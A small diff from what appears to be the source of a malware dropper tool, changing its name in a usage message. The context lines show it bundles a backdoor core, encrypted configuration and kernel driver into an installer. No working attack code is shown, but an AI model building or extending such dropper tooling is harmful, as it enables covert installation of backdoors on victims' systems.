@@ -24,7 +24,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	if (argc != 9) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSDropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
+		printf("  usage:  RCSWin32Dropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
 		printf("  <core> is the backdoor core\n");
 		printf("  <conf> is the backdoor encrypted configuration\n");
 		printf("  <driver> is the kernel driver\n");
